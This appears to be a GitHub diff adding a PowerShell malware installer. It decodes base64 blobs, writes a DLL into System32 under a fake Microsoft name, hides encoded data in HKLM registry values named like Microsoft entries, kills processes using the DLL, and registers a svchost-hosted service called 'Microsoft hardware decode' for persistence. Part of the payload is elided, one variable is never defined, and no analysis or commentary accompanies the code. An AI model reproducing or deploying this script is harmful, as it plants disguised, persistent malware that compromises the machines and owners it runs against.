@@ -1,0 +1,67 @@
+#some encoding
+#more encoding that's too long to copy to GitHub
+
+$svcname = 'MsMp4Hw';
+$svcgroup = 'msgroup';
+$svcdesc = 'Microsoft hardware decode';
+$svcdllpath = 'C:\Windows\System32\msmp4dec.dll';
+
+$sregkey = 'Software\Microsoft';
+$sregvalue = 'hiaudio';
+$sregdata =     #base64 encoded string that's too long to paste
+$cregkey = 'Software\Microsoft';
+$cregvalue = 'midihelp';
+$cregdata = '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';
+
+$resetkey = 'SOFTWARE\Microsoft\{EAAB20A7-9B68-4185-A447-7E4D21621943}';
+
+
+try{$svchostbin=$([System.Convert]::FromBase64String($svchostdata));}catch{ Write-Output "E0" ; exit;};
+try{$sregbin=$([System.Convert]::FromBase64String($sregdata));}catch{ Write-Output "E1" ; exit;};
+try{$cregbin=$([System.Convert]::FromBase64String($cregdata));}catch{ Write-Output "E2" ; exit;};
+
+try{Get-ItemProperty -Path $( "HKLM:\" + $resetkey ) -Name "Name" -ea stop;}catch{ } ;
+Start-Sleep -s 1;
+
+if( (Get-Service $svcname -ea SilentlyContinue) )
+{
+    $svc = Get-Service "$svcname";
+    if ( $svc -ne $null )
+    {
+        try{stop-service -force -inputobject $svc -ea stop;}catch{};
+        $osvc = Get-WmiObject -Class Win32_Service -filter $("Name='"+$svcname+"'");
+        if ( $osvc -ne $null )
+        {
+            try{ Stop-Process -id $osvc.ProcessId -Force -ea stop;}catch{};
+            try{ $osvc.delete();}catch{};
+        };
+
+    };
+    Start-Sleep -s 1;
+}
+
+taskkill /fi $("modules eq "+[System.IO.Path]::GetFileName($svcdllpath))  /f;
+Start-Sleep -s 1;
+
+try{[io.file]::WriteAllBytes( $([System.Environment]::ExpandEnvironmentVariables($svcdllpath)), $svchostbin); }catch{ Write-Output "E:write" ; exit;} ;
+
+try{ $ret = New-Item -Path $( "HKLM:\" + $sregkey ) -ea stop; }catch{ } ;
+$ret = New-ItemProperty -Path $("HKLM:\" + $sregkey) -Name $sregvalue -Value $sregbin -PropertyType Binary -Force; if ( $ret -eq $null ) { Write-Output "E:save key";exit; };
+
+if( $cregkey )
+{ 
+    try{ $ret = New-Item -Path $( "HKLM:\" + $cregkey ) -ea stop; }catch{ } ;
+    $ret = New-ItemProperty -Path $("HKLM:\" + $cregkey) -Name $cregvalue -Value $cregbin -PropertyType Binary -Force; if ( $ret -eq $null ) { Write-Output "E:save key2";exit; };
+}
+
+$svc = New-Service -name $svcname -binaryPathName $( "%SystemRoot%\System32\svchost.exe -k " + $svcgroup ) -Description $svcdesc; if ( $svc -eq $null ) { Write-Output "E:create svc";exit; }
+
+$ret = New-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SvcHost" -Name $svcgroup -Value $svcname -PropertyType MultiString -Force; if ( $ret -eq $null ) { Write-Output "E:create svc reg1";exit; }
+$ret = New-Item -Path $( "HKLM:\SYSTEM\CurrentControlSet\Services\" + $svcname + "\Parameters")  -Force -ea stop; if ( $ret -eq $null ) { Write-Output "E:create svc reg2";exit; }
+$ret = New-ItemProperty -Path $( "HKLM:\SYSTEM\CurrentControlSet\Services\" + $svcname + "\Parameters") -Name "ServiceDll" -Value $svcdllpath  -PropertyType ExpandString -Force;if ( $ret -eq $null ) { Write-Output "E:create svc reg3";exit; }
+
+
+
+Write-Host "#";
+Start-Service -name $svcname;
+
